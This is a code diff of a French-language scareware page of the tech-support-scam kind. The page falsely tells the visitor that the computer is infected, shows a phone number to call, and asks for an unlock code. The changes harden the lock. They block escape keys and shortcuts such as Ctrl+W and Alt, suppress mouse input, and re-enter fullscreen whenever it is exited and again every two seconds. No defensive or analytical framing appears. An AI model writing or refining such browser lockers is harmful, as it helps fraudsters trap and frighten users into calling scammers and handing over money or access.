@@ -10,7 +10,7 @@
             padding: 0;
             box-sizing: border-box;
             user-select: none;
-            cursor: none; /* Désactive totalement le curseur */
+            cursor: none; /* Désactive totalement le pointeur */
         }
         html, body {
             width: 100vw;
@@ -64,7 +64,7 @@
 
     <div class="container">
         <p class="message">⚠️ Votre ordinateur est infecté ⚠️<br>Appelez immédiatement :</p>
-        <p class="alert-number">+33 6 XX XX XX 08</p>
+        <p class="alert-number">+33 6 XX XX XX 09</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
         <p id="error-message"></p>
@@ -91,14 +91,15 @@
 
         // Bloquer tous les raccourcis clavier
         document.addEventListener("keydown", function(event) {
-            let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace"];
-            if (!allowedKeys.includes(event.key)) {
+            let blockedKeys = ["Escape", "Tab", "F11", "F4", "Alt", "Control", "Meta"];
+            if (blockedKeys.includes(event.key) || (event.ctrlKey && event.key === "w")) {
                 event.preventDefault();
+                return false;
             }
         });
 
         // Désactiver totalement la touche Échap
-        document.addEventListener("keydown", function(event) {
+        window.addEventListener("keydown", function(event) {
             if (event.key === "Escape") {
                 event.preventDefault();
                 return false;
@@ -106,20 +107,27 @@
         });
 
         // Désactiver complètement la souris
-        document.addEventListener("mousemove", function(event) {
+        window.addEventListener("mousemove", function(event) {
             event.preventDefault();
         });
-        document.addEventListener("mousedown", function(event) {
+        window.addEventListener("mousedown", function(event) {
             event.preventDefault();
         });
-        document.addEventListener("mouseup", function(event) {
+        window.addEventListener("mouseup", function(event) {
             event.preventDefault();
         });
-        document.addEventListener("contextmenu", function(event) {
+        window.addEventListener("contextmenu", function(event) {
             event.preventDefault();
         });
-        document.addEventListener("wheel", function(event) {
+        window.addEventListener("wheel", function(event) {
             event.preventDefault();
+        });
+
+        // Empêcher la sortie du plein écran
+        document.addEventListener("fullscreenchange", function() {
+            if (!document.fullscreenElement) {
+                openFullscreen();
+            }
         });
 
         // Ajouter un son à chaque touche pressée
@@ -149,6 +157,10 @@
         window.onload = function() {
             inputField.focus();
         };
+
+        // Reforcer le plein écran toutes les 2 secondes
+        setInterval(openFullscreen, 2000);
+
     </script>
 
 </body>
